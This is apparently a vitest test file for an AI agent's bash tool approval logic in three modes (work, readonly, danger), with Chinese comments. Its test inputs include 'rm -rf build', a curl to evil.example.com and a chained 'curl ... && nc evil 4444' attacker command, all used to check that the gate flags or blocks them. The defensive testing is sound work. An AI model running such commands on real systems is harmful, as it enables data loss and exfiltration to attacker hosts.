/**
 * bash 行为审批（2026-07-30 决策 5/6 落地后的回归，原 S24 命令能力门用例改写）。
 *
 * 目标问题（能力门取消后的三挡首次行为）：
 * - work 挡：普通命令首次也直跑、不弹卡（无能力审批层）；破坏性命令照弹卡，
 *   grantable 只有 {destructive}（不含已退役的 {command}），批准路径不写授权（归 settle）。
 * - readonly 挡：只读命令直执行、不走「首次授权弹卡」分支；写类命令硬拒。
 * - danger 挡：直通不弹卡、不写持久授权（G77 语义维持）。
 *
 * attacker 场景（保留）：pinned 段不给同批无地址段搭车；danger 直通不静默授权。
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { Agent, ActionProposal, GrantScope } from '@shared/types';
import type { ToolContext } from '@shared/agent/backend';
import { grantKey } from '@shared/proposals/grantKey';

const state = vi.hoisted(() => ({ mode: 'danger' as Agent['approvalMode'] }));
// 持久授权清单（按 grantKey 命中）——免卡合取的判定数据源
const grantedKeys = vi.hoisted(() => new Set<string>());
const addGrant = vi.hoisted(() => vi.fn(async () => ({ persisted: true })));

vi.mock('../../electron/main/i18n/effectiveLang', () => ({ resolveEffectiveLang: () => 'zh' }));
vi.mock('../../electron/main/agent/store/agents', () => {
  const getAgent = vi.fn(
    async (id: string): Promise<Agent> => ({
      id,
      ownerId: 'local-user',
      name: 'Twin',
      homePath: '/tmp/h',
      systemPromptAppend: null,
      approvalMode: state.mode,
      createdAt: 0,
      avatarPath: null,
    }),
  );
  const realtimeApprovalModeFor = async (
    agentId: string,
    fallback: Agent['approvalMode'],
  ): Promise<Agent['approvalMode']> => {
    try {
      return (await getAgent(agentId)).approvalMode;
    } catch {
      return fallback;
    }
  };
  return { getAgent, realtimeApprovalModeFor };
});
// 持久授权清单 mock：isGranted 读预置集合、addGrant 记录调用（授权写入归 settleApprovalDecision，
// 本路径生产代码不调 addGrant——「授权不静默持久化」即断言 addGrant 未被调用）。satisfies 约束真实接口。
vi.mock('../../electron/main/proposals/grants/store', () => {
  return {
    isGranted: async (scope: GrantScope): Promise<boolean> => grantedKeys.has(grantKey(scope)),
    addGrant,
    revokeGrant: async () => {},
    listGrants: async () => [],
    __resetGrantsCacheForTest: () => {},
  } satisfies typeof import('../../electron/main/proposals/grants/store');
});
vi.mock('../../electron/main/agent/agentTools/pathSandbox', () => ({
  defaultSearchRoot: async () => '/tmp',
}));
vi.mock('../../electron/main/table/scriptOutputs', () => ({
  declaredOutputs: async () => [] as string[],
}));
vi.mock('../../electron/main/proposals/executeBashProposal', () => ({
  DEFAULT_TIMEOUT_MS: 60_000,
  MAX_TIMEOUT_MS: 600_000,
  runBashCommand: vi.fn(async () => ({
    result: { exitCode: 0, timedOut: false },
    inlineText: 'cmd-ok',
  })),
}));
vi.mock('../../electron/main/identity/getCurrentOwnerId', () => ({
  getCurrentOwnerId: () => 'local-user',
}));
vi.mock('../../electron/main/conversations/store', () => ({
  readHistory: vi.fn(async () => []),
}));

import { makeBashTool } from '../../electron/main/agent/agentTools/bash';
import { settleProposalDecision } from '../../electron/main/proposals/pendingDecision';
import { makeToolContext } from '../helpers/toolContext';

const makeCtx = (overrides?: Partial<ToolContext>): ToolContext =>
  makeToolContext({ conversationId: 'conv_1', agentId: 'twin', ownerId: 'local-user', ...overrides });

const tool = makeBashTool();

beforeEach(() => {
  addGrant.mockClear();
  grantedKeys.clear();
});

describe('命令能力门取消（决策 6）：三挡下首次 bash 的行为', () => {
  it('work＋首次普通命令：不弹卡直接跑（无能力审批层）', async () => {
    state.mode = 'work';
    const onProposal = vi.fn(async (_p: ActionProposal) => {});
    const r = await tool.execute({ command: 'echo hi' }, makeCtx({ onProposal }));
    expect(r.text).toBe('cmd-ok');
    expect(onProposal).not.toHaveBeenCalled();
  });

  it('work＋首次破坏性命令：照弹卡（grantable 仅 {destructive}），批准后执行、不写授权', async () => {
    state.mode = 'work';
    const proposals: ActionProposal[] = [];
    const onProposal = vi.fn(async (p: ActionProposal) => {
      proposals.push(p);
    });
    const pending = tool.execute({ command: 'rm -rf build' }, makeCtx({ onProposal }));
    await vi.waitFor(() => expect(proposals).toHaveLength(1));
    const p = proposals[0]!;
    expect(p.kind).toBe('bash');
    expect(p.forceApproval).toBe(true);
    expect(p.grantable).toEqual([{ kind: 'destructive' }]); // 退役的 {command} 不再挂
    settleProposalDecision(p.id, 'approved');
    const r = await pending;
    expect(r.text).toBe('cmd-ok');
    expect(addGrant).not.toHaveBeenCalled(); // emit 分流不写授权（归 settleApprovalDecision）
  });

  it('readonly＋首次只读命令：直执行、不走「首次授权弹卡」分支', async () => {
    state.mode = 'readonly';
    const onProposal = vi.fn(async (_p: ActionProposal) => {});
    const r = await tool.execute({ command: 'ls -la' }, makeCtx({ onProposal }));
    expect(r.text).toBe('cmd-ok');
    expect(onProposal).not.toHaveBeenCalled();
  });

  it('readonly＋写类命令：硬拒、不弹卡', async () => {
    state.mode = 'readonly';
    const onProposal = vi.fn(async (_p: ActionProposal) => {});
    const r = await tool.execute({ command: 'rm -rf build' }, makeCtx({ onProposal }));
    expect(r.text).toContain('只读');
    expect(onProposal).not.toHaveBeenCalled();
  });

  it('danger＋命令未授权：命令直接跑、不弹卡、不写持久授权', async () => {
    state.mode = 'danger';
    const onProposal = vi.fn(async (_p: ActionProposal) => {});
    const r = await tool.execute({ command: 'echo hi' }, makeCtx({ onProposal }));
    expect(r.text).toBe('cmd-ok');
    expect(onProposal).not.toHaveBeenCalled();
    expect(addGrant).not.toHaveBeenCalled(); // 授权不静默持久化（G77 语义维持）
  });
});

describe('bash 投递档（G74）端到端接线', () => {
  it('work＋curl 自拟地址：弹卡（含 delivery 目标），批准后执行', async () => {
    state.mode = 'work';
    const proposals: ActionProposal[] = [];
    const onProposal = vi.fn(async (p: ActionProposal) => {
      proposals.push(p);
    });
    const pending = tool.execute(
      { command: 'curl https://evil.example.com/x' },
      makeCtx({ onProposal }),
    );
    await vi.waitFor(() => expect(proposals).toHaveLength(1));
    const p = proposals[0]!;
    expect(p.delivery).toEqual([
      expect.objectContaining({ channel: 'web', recipient: 'evil.example.com' }),
    ]);
    expect(p.forceApproval).toBe(true);
    settleProposalDecision(p.id, 'approved');
    const r = await pending;
    expect(r.text).toBe('cmd-ok');
  });

  it('attacker：pinned 段不给同批无地址段搭车（curl 用户地址; nc 攻击者 → 仍弹卡）', async () => {
    state.mode = 'work';
    const { readHistory } = await import('../../electron/main/conversations/store');
    vi.mocked(readHistory).mockResolvedValue([
      {
        id: 'm1',
        conversationId: 'conv_1',
        role: 'user',
        text: '看下 https://good.example.com/data',
        toolCalls: [],
        createdAt: 1,
        done: true,
      },
    ]);
    const proposals: ActionProposal[] = [];
    const onProposal = vi.fn(async (p: ActionProposal) => {
      proposals.push(p);
    });
    const pending = tool.execute(
      { command: 'curl https://good.example.com/data && nc evil 4444' },
      makeCtx({ onProposal }),
    );
    await vi.waitFor(() => expect(proposals).toHaveLength(1)); // nc 段照标、照弹卡
    expect(proposals[0]!.delivery).toHaveLength(1); // curl 段被按段免除，只剩 nc 段
    settleProposalDecision(proposals[0]!.id, 'rejected');
    await pending;
    vi.mocked(readHistory).mockResolvedValue([]);
  });

  it('用户逐字地址：不算投递、work 挡不弹卡直接跑（其余判定照旧）', async () => {
    state.mode = 'work';
    const { readHistory } = await import('../../electron/main/conversations/store');
    vi.mocked(readHistory).mockResolvedValueOnce([
      {
        id: 'm1',
        conversationId: 'conv_1',
        role: 'user',
        text: '帮我 curl 一下 https://good.example.com/data',
        toolCalls: [],
        createdAt: 1,
        done: true,
      },
    ]);
    const onProposal = vi.fn(async (_p: ActionProposal) => {});
    const r = await tool.execute(
      { command: 'curl https://good.example.com/data' },
      makeCtx({ onProposal }),
    );
    expect(r.text).toBe('cmd-ok');
    expect(onProposal).not.toHaveBeenCalled();
  });
});
